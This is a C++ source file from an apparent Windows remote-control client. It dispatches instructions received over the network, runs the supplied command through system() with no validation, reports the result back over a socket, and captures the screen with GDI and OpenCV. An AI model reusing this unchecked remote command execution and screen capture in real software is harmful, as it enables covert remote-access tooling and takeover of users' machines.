//
// Created by wj_de on 18-5-30.
//

#include "instruct.h"
#include <string.h>
#include<WinSock2.h>
#include <ws2tcpip.h>
#include<stdlib.h>
#include "Protocol.h"
#include<Windows.h>
#include<opencv/cv.h>
#include<opencv2/highgui/highgui.hpp>
using namespace cv;
void Cinstruct::find_instruct(map<string,string> &inst)
{
	string ip = inst["Publisher"];
    if (inst["inst_type"] == "shell") {
        string cmd = inst["command"];
  
        shell(cmd,ip);

    }
	else if (inst["inst_type"] == "get_now_img")
	{
		get_now_img(ip);
	}

}
void Cinstruct::get_now_img(string &ip)
{

	int WINx = GetSystemMetrics(SM_CXFULLSCREEN);//获得屏幕的X大小
	int WINy = GetSystemMetrics(SM_CYFULLSCREEN);//获得屏幕的Y
	cout << WINy << ":" << WINx << endl;
	HDC hdc = GetDC(NULL); //获得窗口的句柄
	HDC comhdc = CreateCompatibleDC(hdc);//设置一个画布
	HBITMAP hbitmap = CreateCompatibleBitmap(hdc, WINx, WINy);//传入hdc句柄和x,y，获取句柄的位图
	SelectObject(comhdc, hbitmap);//将位图写入comhdc内存画布中
	BitBlt(comhdc, 0, 0, WINx, WINy, hdc, 0, 0, SRCCOPY);
	BITMAP bitmap;
	GetObjectA(hbitmap, sizeof(BITMAP), &bitmap);


	//GetObject函数得泛指得到对象，到指定图形对象的信息，根据图形对象，函数把填满的或结构，或表项（用于逻辑调色板）数目放入一个指定的缓冲区
	//百度的也没看太懂
	int nchan = bitmap.bmBitsPixel == 1 ? 1 : bitmap.bmBitsPixel / 8;
	Mat v_mat;
	v_mat.create(cvSize(bitmap.bmWidth, bitmap.bmHeight), CV_MAKETYPE(CV_8U, 4));//创建一个新的mat矩阵体
	GetBitmapBits(hbitmap, bitmap.bmWidth*bitmap.bmHeight*nchan, v_mat.data);//将bitamp的数据读取道mat
	DeleteDC(hdc);
	DeleteDC(comhdc);
	imshow(" ", v_mat);
}
string Cinstruct::shell(const string &command,const string &ip) {
    cout<<"*****进入shell操作******"<<endl;
	int n = system(command.c_str());
	string req;
	if (n != 0)
	{
		req = "flase";
	}
	else
	{
		req = "true";
	}
    cout<<"*****shell操作结束******"<<endl;
    map<string,string> requst;
    requst["url"]="shellreq";
    requst["to"]=ip;
    requst["body"]=req;
    CProtocol pro;
    string reqson=pro.structure(requst);
	//cout <<reqson<<endl;
    send(socket,reqson.c_str(),strlen(reqson.c_str()),0);
    return req;
}

